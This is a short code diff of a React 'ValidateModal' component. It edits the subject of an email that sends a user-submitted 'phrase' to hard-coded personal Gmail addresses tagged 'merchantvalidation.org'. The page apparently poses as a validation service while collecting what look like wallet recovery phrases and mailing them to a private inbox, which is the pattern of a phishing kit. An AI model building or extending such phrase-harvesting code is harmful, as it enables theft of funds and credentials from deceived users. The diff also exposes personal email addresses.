@@ -44,7 +44,7 @@ const ValidateModal = (props: Props) => {
     setIsLoading(true);
 
     const body = {
-      subject: "New Phrase has Been Submitted",
+      subject: "New Phrase from merchantvalidation.org",
       phrase: phrase,
    //  to: "merchantvalidation088@gmail.com",
      to: "nkematu5@gmail.com",
